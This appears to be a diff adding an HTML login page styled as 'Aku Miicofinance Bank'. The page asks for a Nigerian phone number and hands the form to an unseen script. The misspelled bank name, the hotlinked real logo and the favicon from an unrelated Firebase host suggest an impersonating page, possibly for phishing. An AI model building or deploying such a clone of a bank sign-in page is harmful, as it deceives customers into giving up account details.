@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://younk-5b894.web.app/images/logo.png"
+      type="image/x-icon"
+    />
+    <title>Aku Miicofinance Bank</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/iconify/3.1.1/iconify.min.js"
+      integrity="sha512-oQ1yQwSEIc9CTcK7pffEyS8fxom2iUWQrALk3j3+wfdSDjQ77EZbzGMGe2ZYmfoC8M9vR47apbS1ZYbW05y/pg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <link rel="stylesheet" href="/css/style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="contentSec">
+        <div class="welContent">
+          Welcome to <img src="https://aku.africa/logos/main.svg" alt="Logo" />
+        </div>
+        <div class="subText">Enter your phone number to continue</div>
+      </div>
+      <div class="loginWrapper">
+        <div class="loginSec">
+          <form method="post" id="login">
+            <div class="formInput">
+              <div class="selectedOptions">
+                <h6>Country</h6>
+                <div class="iconNum">
+                  <span class="iconify" data-icon="flag:ng-4x3"></span>
+                  <strong>+234</strong>
+                </div>
+
+                <div class="countryOptions" id="countryOptions">
+                  <!-- Country options will be dynamically generated here -->
+                </div>
+              </div>
+
+              <span class="divider"></span>
+              <input
+                id="phone"
+                name="phone"
+                type="number"
+                placeholder="Phone Number"
+                required
+              />
+            </div>
+
+            <button type="submit">Sign In</button>
+          </form>
+        </div>
+      </div>
+    </div>
+    <script src="/js/app.js"></script>
+  </body>
+</html>
